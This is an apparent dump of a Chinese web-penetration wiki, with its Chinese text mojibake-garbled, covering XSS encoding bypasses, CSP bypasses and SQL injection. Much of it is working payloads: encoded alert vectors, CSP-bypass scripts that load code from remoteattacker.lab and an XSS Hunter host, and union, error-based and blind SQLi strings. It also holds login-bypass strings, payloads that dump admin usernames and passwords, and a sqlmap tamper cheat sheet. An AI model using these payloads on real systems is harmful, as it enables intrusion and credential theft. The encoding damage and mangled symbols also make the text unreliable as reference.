scriptã€style è¿™æ ·çš„åŸå§‹æ–‡æœ¬å…ƒç´ åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦,ä¸ä¼šè§¦å‘è¯­å¥åŸæœ‰çš„ç»“æœã€‚ä½†æ˜¯å½“åœ¨å‰é¢åŠ ä¸Š svg ï¼Œå³å¯æˆåŠŸå¼¹çª—ã€‚ URLç¼–ç æˆ‘ä»¬å¯ä»¥å¹¶å°†srcæˆ–hrefå±æ€§ä¸­çš„å†…å®¹è¿›è¡ŒURLç¼–ç ï¼Œå½“HTMLè§£æå™¨å¯¹srcæˆ–hrefä¸­çš„å­—ç¬¦å®ŒæˆHTMLè§£ç åï¼Œæ¥ä¸‹æ¥URLè§£æå™¨ä¼šå¯¹srcæˆ–hrefä¸­çš„å€¼è¿›è¡ŒURLè§£ç ã€‚ a href=javascript:alert(xss)test/aa href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29test/aiframe src=javascript:alert(xss)/iframeiframe src=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29/iframe!--ä¼ªåè®®å¤´ javascript: æ˜¯ä¸èƒ½è¿›è¡Œç¼–ç çš„ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªURLè§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œå³ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´DOMèŠ‚ç‚¹ä¸­è¢«ç¼–ç çš„â€œjavascriptâ€æ²¡æœ‰è¢«è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«äº†ã€‚å¦‚ï¼šhttp://www.baidu.com å¯ä»¥è¢«URLç¼–ç ä¸º http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6dï¼Œä½†æ˜¯ä¸èƒ½æŠŠåè®®ä¹Ÿè¿›URLç¼–ç ï¼š%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6dä½†æ˜¯ä¼ªåè®®å¤´ javascript: å¯ä»¥è¿›è¡ŒHTMLç¼–ç ã€‚-- Javascript ç¼–ç æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸º Javascript ç¼–ç ã€‚å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ scriptã€style è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ srcã€ href åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚Javascript ä¸­å¯ä»¥è¯†åˆ«çš„ç¼–ç ç±»å‹æœ‰ï¼š Unicode ç¼–ç  å…«è¿›åˆ¶ç¼–ç  åå…­è¿›åˆ¶ç¼–ç  Unicodeç¼–ç çš„æ¯”è¾ƒå¹¿æ³›ï¼Œè€Œå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶åªæœ‰åœ¨DOMç¯å¢ƒæˆ–eval()ç­‰å‡½æ•°ä¸­æ‰å¯ä»¥ç”¨ã€‚ Unicode ç¼–ç scriptalert(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)/scripta href=javascript:alert(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)test/a!--ä¸èƒ½å¯¹ä¼ªåè®®å¤´ javascript: è¿›è¡Œ Javascript ç¼–ç ã€‚å¹¶ä¸”åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·è¿™æ ·çš„ç¬¦å·æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿› Javascript ç¼–ç ï¼Œä½†æ˜¯èƒ½è¿›è¡ŒHTMLç¼–ç ã€‚-- åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç å¯¹äºå…«è¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ Unicode ç¼–ç è¿˜æ˜¯æœ‰åŒºåˆ«ï¼Œè¦æƒ³è®©ä»–ä»¬èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬è¦å°†ä»–ä»¬æ”¾åœ¨DOMç¯å¢ƒä¸­scriptalert(xss)/scriptscript\\141\\154\\145\\162\\164(xss)/scripta href=javascript:alert(xss)test/aa href=javascript:\\x61\\x6c\\x65\\x72\\x74(xss)test/a!--å¦‚æœè¿‡æ»¤äº† ã€ã€ã€ã€ã€% ç­‰ç­‰è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨JavaScriptç¼–ç çš„æ–¹æ³•å°†XSSè¯­å¥å…¨éƒ¨ç¼–ç --å³ iframe src=javascript:alert(xss)/iframe çš„ä»¥ä¸‹ç¼–ç éƒ½å¯ä»¥å¼¹çª—ï¼š!--Unicodeç¼–ç --\\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E!--å…«è¿›åˆ¶ç¼–ç --\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76!--åå…­è¿›åˆ¶ç¼–ç --\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e å¦ä¸€ç§å¼¹çª—çš„æ–¹æ³•scriptalert(xss)/scriptscripteval(\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51)/scripta href=javascript:alert(xss)test/aa href=javascript:eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29)test/aimg src=x onerror=alert(xss)img src=x onerror=eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29) æ··åˆç¼–ç a href=javascript:alert(xss)test/aé¦–å…ˆå¯¹â€œalertâ€è¿›è¡ŒJavaScript Unicodeç¼–ç ï¼ša href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aç„¶åå†å¯¹ \\u0061\\u006c\\u0065\\u0072\\u0074 è¿›è¡ŒURLç¼–ç ï¼ša href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(xss)test/aæœ€åå¯¹æ ‡ç­¾ä¸­çš„ javascript:%5c%75...%37%34(xss) æ•´ä½“è¿›è¡ŒHTMLç¼–ç å³å¯ï¼š svga href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x31;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x36;#x33;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x35;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x32;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x34;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a å››ã€CSPç»•è¿‡1.jsonpç»•è¿‡è¦æ±‚ï¼š CSPï¼šfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self https://www.google.com https://www.youtube.com; object-src none;/font 2.ç»•è¿‡ CSP é»˜è®¤æºè¦æ±‚ï¼š CSP ç±»ä¼¼font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);Content-Security-Policy: default-src self unsafe-inline;/fontï¼Œ æœ‰æ•ˆè½½è·ï¼š font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);http://example.lab/csp.php?xss=f=document.createElement%28iframe%29;f.id=pwn;f.src=/robots.txt;f.onload=%28%29=%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;/font script=document.createElement(script);script.src=//remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 3.ç»•è¿‡ CSP åœ¨çº¿è¯„ä¼°(iframeè¢«ç¦æ­¢)è¦æ±‚ï¼š CSPæˆ– CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);inline/fontæˆ–font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);eval/font æœ‰æ•ˆè½½è·ï¼š ddocument;fd.createElement(â€œiframeâ€);f.srcd.querySelector(â€˜link[href*â€.cssâ€]â€™).href;d.body.append(f);sd.createElement(â€œscriptâ€);s.srcâ€https:[YOUR_XSSHUNTER_USERNAME].xss.htâ€;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) 4.ç»•è¿‡ CSP è„šæœ¬æºè‡ªèº«è¦æ±‚ï¼š ç±»ä¼¼ CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self/font æœ‰æ•ˆè½½è·ï¼š 5.ç»•è¿‡ CSP è„šæœ¬æºæ•°æ®è¦æ±‚ï¼š CSP å°±åƒMozillafont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self data:/fontå®˜æ–¹æ–‡æ¡£ä¸­è­¦å‘Šçš„é‚£æ ·ã€‚ æœ‰æ•ˆè½½è·ï¼š /"},{"title":"SQLiæµç¨‹","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLiæµç¨‹.html","content":"ä¸€ã€æ€è·¯1ã€åˆ¤æ–­æ³¨å…¥ç‚¹åœ¨GETå‚æ•°ã€POSTå‚æ•°ã€ä»¥åŠHTTPå¤´éƒ¨ç­‰ï¼ŒåŒ…æ‹¬Cookieã€Refererã€XFF(X-Forwarded-for)ã€UAç­‰åœ°æ–¹å°è¯•æ’å…¥ä»£ç ã€ç¬¦å·æˆ–è¯­å¥ï¼Œå°è¯•æ˜¯å¦å­˜åœ¨æ•°æ®åº“å‚æ•°è¯»å–è¡Œä¸ºï¼Œä»¥åŠèƒ½å¦å¯¹å…¶å‚æ•°äº§ç”Ÿå½±å“ï¼Œå¦‚äº§ç”Ÿå½±å“åˆ™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ 1ï¼‰ã€GET æ³¨å…¥æäº¤æ•°æ®çš„æ–¹å¼æ˜¯ GETï¼Œæ³¨å…¥ç‚¹çš„ä½ç½®åœ¨ GET å‚æ•°éƒ¨åˆ†ã€‚ä¾‹å¦‚æœ‰è¿™æ ·çš„ä¸€ä¸ªURLï¼šhttp://xxx.com/news.php?id=1ï¼Œidæ˜¯æ³¨å…¥ç‚¹ã€‚ 2ï¼‰ã€POST æ³¨å…¥ä½¿ç”¨ POST æ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨ POST æ•°æ®éƒ¨åˆ†ï¼Œé€šå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­ã€‚ 3ï¼‰ã€HTTP å¤´éƒ¨æ³¨å…¥æ³¨å…¥ç‚¹åœ¨ HTTP è¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨ User-Agent å­—æ®µä¸­ï¼ŒCookie å­—æ®µä¸­ç­‰ã€‚ 2ã€åˆ¤æ–­æ•°æ®åº“ç±»å‹åˆ¤æ–­ç½‘ç«™ä½¿ç”¨çš„æ˜¯å“ªä¸ªæ•°æ®åº“ï¼Œå¸¸è§æ•°æ®åº“å¦‚ï¼šMySQLã€MSSQL(SQLserver)ã€Oracleã€Accessã€PostgreSQLã€BD2ç­‰ç­‰ã€‚ nmap ç«¯å£æ‰«æ æ•°æ®åº“ç±»å‹ é»˜è®¤ç«¯å£å· Oracle 1521 SQL Server 1433 MySQL 3306 PostgreSql 5432 ç½‘ç«™ç±»å‹ æ•°æ®åº“ç±»å‹ asp SQL Serverï¼ŒAccess .net SQL Server php Mysqlï¼ŒPostgreSql java Oracleï¼ŒMysql æ•°æ®åº“ç±»å‹ ç‰¹æœ‰çš„ç³»ç»Ÿè¡¨ Oracle SYS.USER_TABLES SQL Server SYSOBJECTS MySQL(MySQLç‰ˆæœ¬åœ¨5.0ä»¥ä¸Š) INFORMATION_SCHEMA.TABLES Access MSYSOBJECTS 2ã€æœ‰å›æ˜¾ æŠ¥é”™æŸ¥è¯¢ exp: andor exp(~(select * from (select user () ) a) ); updatexml: andor(updatexml(1,concat(0x7e,(select database()),0x7e),1)) extractvalue: extractvalue(1,concat(0x7e,version(),0x7e)) è”åˆæŸ¥è¯¢ ç¡®å®šåˆ—æ•°ï¼šunion select 1,2,3# ç¡®å®šå›æ˜¾åˆ—ï¼šæ¯”å¦‚æŸ¥å‡ºæ¥ 1ï¼Œ2 é‚£å°±åœ¨1ï¼Œ2ä¸Šè¿›è¡ŒæŸ¥è¯¢ ç¡®å®šæ•°æ®åº“ï¼šunion select database() ,2,3# ç¡®å®šè¡¨ï¼šunion select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schemadatabase()# ç¡®å®šåˆ—ï¼šunion select (group_concat(column_name)),2,3 from information_schema.columns where table_nameâ€™ â€˜# ç¡®å®šç”¨æˆ·ï¼šunion select 1,group_concat(user),3 from â€˜ â€˜# information_schema.schemata #information_schemaä¸‹é¢çš„æ‰€æœ‰æ•°æ®åº“å information_schema.tables #information_schemaä¸‹é¢çš„æ‰€æœ‰è¡¨å information_schema.columns #information_schemaä¸‹é¢æ‰€æœ‰çš„åˆ—å table_name #è¡¨å column_name #åˆ—å table_schema #æ•°æ®åº“å schema_name #æ•°æ®åº“åˆ—è¡¨å åŸºäºæŠ¥é”™boolç›²æ³¨and ascii(substr(database(),1,1))115 3ã€æ— å›æ˜¾ åŸºäºæ—¶é—´boolç›²æ³¨ æ•°æ®åº“ï¼šif(ascii(substr(database(),1,1))114,1,sleep(5))# è¡¨if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schemadatabase() LIMIT 0,1),1,1))114,1,sleep(5))#LIMIT 0,1 â†’ è·å–ç¬¬ä¸€å¼ è¡¨ï¼ˆå¦‚ â€˜usersâ€™ï¼‰ LIMIT 1,1 â†’ è·å–ç¬¬äºŒå¼ è¡¨ï¼ˆå¦‚ â€˜productsâ€™ï¼‰ 4ã€å…¶ä»– å®½å­—èŠ‚ï¼šâ€™è¢«è½¬ä¹‰ä¸º %dfâ€™ å †å ï¼šid1â€™; insert into users values(â€˜adminâ€™,â€™passwordâ€™)#"},{"title":"SQLæ³¨å…¥","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLæ³¨å…¥.html","content":"SQLæ³¨å…¥ä¸€ã€MySqL ä¸€ ã€åŒç«™ åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ and 11 é¡µé¢æ­£å¸¸ and 12 é¡µé¢å¼‚å¸¸ å¦‚æœè¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰å¼‚å¸¸ï¼Œé‚£å°±è¯•è¯•å­—ç¬¦é›† ?id1â€™ é€šè¿‡order byåˆ¤æ–­æ³¨å…¥çš„å­—æ®µæ•°ï¼ˆçŒœä¸€ä¸‹ï¼‰ é¡µé¢é”™è¯¯ä¸æ­£å¸¸çš„ä¸´ç•Œç‚¹å°±æ˜¯å­—æ®µæ•° é€šè¿‡union æ¥æµ‹è¯• è®©idè´Ÿæ•°æˆ–è€…and12è®©ç½‘é¡µæŠ¥é”™ï¼ŒæŠ¥é”™çš„é‚£å‡ ä¸ªæ•°å­—è®°ä½ï¼Œé‚£ä¸ªæ•°å­—æŠ¥é”™å°±åœ¨å“ªé‡ŒæŸ¥ æ¯”å¦‚2ï¼Œ3æŠ¥é”™ï¼Œå¯ä»¥ Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·union select 1ï¼Œversion(),database()ï¼Œ4 ä¿¡æ¯æ”¶é›† æ•°æ®åº“ç‰ˆæœ¬ï¼šversion() æ•°æ®åº“åå­—ï¼šdatabase() æ•°æ®åº“ç”¨æˆ·ï¼šuser() æ“ä½œç³»ç»Ÿï¼š@@version_compile_os åœ¨mysql5.0ä»¥åçš„ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªinformation_schemaæ•°æ®åº“ã€é‡Œé¢å­˜å‚¨è®°å½•æ•°æ®åº“åã€è¡¨åã€åˆ—åçš„æ•°æ®åº“ï¼Œç›¸å½“äºå¯ä»¥é€šè¿‡information_schemaè¿™ä¸ªæ•°æ®åº“è·å–åˆ°æ•°æ®åº“ä¸‹é¢çš„è¡¨åå’Œåˆ—å è·å–ç›¸å…³ä¿¡æ¯ ? id-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schemaâ€™ â€˜ ? id-1union select 1,group_concat(column_name),3 from information_schema.columns where table_nameâ€™ â€˜ ? id-1union select 1,group_concat(user),group_concat(password) from ____ information_schema.schemata #information_schemaä¸‹é¢çš„æ‰€æœ‰æ•°æ®åº“å information_schema.tables #information_schemaä¸‹é¢çš„æ‰€æœ‰è¡¨å information_schema.columns #information_schemaä¸‹é¢æ‰€æœ‰çš„åˆ—å table_name #è¡¨å column_name #åˆ—å table_schema #æ•°æ®åº“å schema_name #æ•°æ®åº“åˆ—è¡¨mingå äºŒ ã€è·¨åº“æŸ¥è¯¢ ? id-1union select 1,group_concat(schema_name),3 from information_schema.schemata ä¸‰ã€æ–‡ä»¶è¯»å†™å‡½æ•° load_file æ–‡ä»¶è¯»å– into outfile æˆ–into dumpfile æ–‡ä»¶å†™å…¥ ï¼åœ¨æ³¨å…¥ç‚¹æ“ä½œ å››ã€int å‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ•´æ•° $sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; echo $sql; $result=mysql_query($sql);else echo ni shi ge jj?;``` äº”ã€å‚æ•°æäº¤æ³¨å…¥ #ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹æ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJsoNç­‰#ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•GET, POST,COOKIEï¼ŒREQUESTï¼ŒHTTPå¤´ç­‰å…¶ä¸­sqlè¯­å¥å¹²æ‰°ç¬¦å·: ,,s,),ç­‰ï¼Œå…·ä½“éœ€çœ‹å†™æ³• äºŒã€å…¶ä»–æ•°æ®åº“ç‰¹ç‚¹ä¸€ã€accessæ³¨å…¥ Accessæ•°æ®åº“ 1è¡¨å 2åˆ—å 3æ•°æ® access æ•°æ®åº“éƒ½æ˜¯å­˜æ”¾åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œåç¼€æ ¼å¼ä¸º mdbï¼Œaspï¼Œasa,å¯ä»¥é€šè¿‡ä¸€äº›æš´åº“æ‰‹æ®µã€ç›®å½•çŒœè§£ç­‰ç›´æ¥ä¸‹è½½æ•°æ®åº“ accessä¸‰å¤§æ”»å‡»æ‰‹æ³• accessæ³¨å…¥æ”»å‡»ç‰‡æ®µ-è”åˆæŸ¥è¯¢æ³• accessæ³¨å…¥æ”»å‡»ç‰‡æ®µ-é€å­—çŒœè§£æ³• å·¥å…·ç±»çš„ä½¿ç”¨æ³¨å…¥ï¼ˆæ¨èï¼‰ Accessæ³¨å…¥æ”»å‡»æ–¹å¼ union æ³¨å…¥ã€http header æ³¨å…¥ã€åç§»æ³¨å…¥ç­‰ äºŒã€msSQLæ³¨å…¥https://www.cnblogs.com/xishaonian/p/6173644.html ä¸‰ã€postgresqlæ³¨å…¥https://www.cnblogs.com/KevinGeorge/p/8446874.html å››ã€Oracleæ³¨å…¥https://www.cnblogs.com/peterpan0707007/p/8242119.html äº”ã€mongoDBæ³¨å…¥https://www.cnblogs.com/wefeng/p/11503102.html SQLmapä¸èƒ½è¯†åˆ«MongoDBè¿™é‡Œä»‹ç»nosqlattack:https://github.com/youngyangyang04/NoSQLAttack ä¸‰ã€ 12ç§æŠ¥é”™æ³¨å…¥+ä¸‡èƒ½è¯­å¥1ã€é€šè¿‡flooræŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2ã€é€šè¿‡ExtractValueæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3ã€é€šè¿‡UpdateXmlæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and 1(updatexml(1,concat(0x3a,(select user())),1)) 4ã€é€šè¿‡NAME_CONSTæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5ã€é€šè¿‡joinæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: select * from(select * from mysql.user ajoin mysql.user b)c; 6ã€é€šè¿‡expæŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and exp(~(select * from (select user () ) a) ); 7ã€é€šè¿‡GeometryCollection()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and GeometryCollection(()select *from(select user () )a)b ); 8ã€é€šè¿‡polygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and polygon (()select * from(select user ())a)b ); 9ã€é€šè¿‡multipoint ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multipoint (()select * from(select user() )a)b ); 10ã€é€šè¿‡multlinestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multlinestring (()select * from(selectuser () )a)b ); 11ã€é€šè¿‡multpolygon ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and multpolygon (()select * from(selectuser () )a)b ); 12ã€é€šè¿‡linestring ()æŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and linestring (()select * from(select user() )a)b ); å…³äºPOSTæ³¨å…¥ å¸¸ç”¨çš„ä¸‡èƒ½usernameè¯­å¥ï¼š a â€™ or 11 # a â€œ) or 11 # aâ€˜) or 11 # aâ€ or â€œ1â€â€1 â€˜ or â€˜1â€™â€™1 â€˜ or (length(database())) 8 (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯) â€˜ or (ascii(substr((select database()) ,1,1))) 115 # (ç”¨äºè¾“å…¥â€™ â€œéƒ½æ²¡æœ‰é”™è¯¯) â€œ) or (â€œ1â€)(â€œ1 â€œ) or 11 or if(11, sleep(1), null) # â€œ) or (length(database())) 8 # â€œ) or (ascii(substr((select database()) ,1,1))) 115 or if(11, sleep(1), null) # postå‹ç›²æ³¨é€šæ€payloadï¼š unameadmin%dfâ€™or()or%200%23passwdsubmitSubmit. ä¸‡èƒ½å¯†ç  ï¿½â€™or11# å…³äºUPDATEXML,REFERER,COOKIEçš„æ„é€  User-Agent:â€¦â€¦â€¦ or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) # Referer: â€™ or updatexml(1,concat(0x7e,database(),0x7e),1),â€,â€) # Cookie:username: admin â€™ or updatexml(1,concat(0x7e,database(),0x7e),1) # updatexmlæŠ¥é”™æ³¨å…¥ çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) é“¾æ¥ç”¨æˆ·ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) é“¾æ¥æ•°æ®åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) çˆ†åº“ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†è¡¨ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†å­—æ®µï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) çˆ†å­—æ®µå†…å®¹ï¼š?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)"},{"title":"SQLMAP","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLMAP.html","content":"å¸¸ç”¨å‚æ•° font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-u/font font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--url/font æŒ‡å®šç›®æ ‡url font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-m/font ä»æ–‡æœ¬ä¸­è·å–å¤šä¸ªç›®æ ‡æ‰«æ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-r/font ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--data/font ä»¥POSTæ–¹å¼æäº¤æ•°æ® font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-random-agent/font éšæœºua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--user-agent/font æŒ‡å®šua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--delay/font è®¾ç½®è¯·æ±‚é—´çš„å»¶è¿Ÿ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--timeout/font æŒ‡å®šè¶…æ—¶æ—¶é—´ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--dbms/font æŒ‡å®šdbï¼Œsqlmapæ”¯æŒçš„dbæœ‰MySQLã€Oracleã€PostgreSQLã€Microsoft SQL Serverã€Microsoft Accessã€SQLiteç­‰ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--os/font æŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--tamper/font æŒ‡å®štamper font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--level/font æŒ‡å®šæ¢æµ‹ç­‰çº§ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--risk/font æŒ‡å®šé£é™©ç­‰çº§ **font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--technique/font** ****æ³¨å…¥æŠ€æœ¯ B: Boolean-based blind SQL injection E: Error-based SQL injection U: UNION query SQL injection S: Stacked queries SQL injection T: Time-based blind SQL injection 11.5.2. Tamper é€ŸæŸ¥ è„šæœ¬åç§° ä½œç”¨ apostrophemask.py ç”¨utf8ä»£æ›¿å¼•å· equaltolike.py like ä»£æ›¿ç­‰å· space2dash.py ç»•è¿‡è¿‡æ»¤â€™â€™ æ›¿æ¢ç©ºæ ¼å­—ç¬¦(â€œ)ï¼Œ(â€˜â€™ - â€˜)åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šï¼Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ–°è¡Œ(â€˜nâ€™) greatest.py ç»•è¿‡è¿‡æ»¤â€™â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·ã€‚ space2hash.py ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦ apostrophenullencode.py 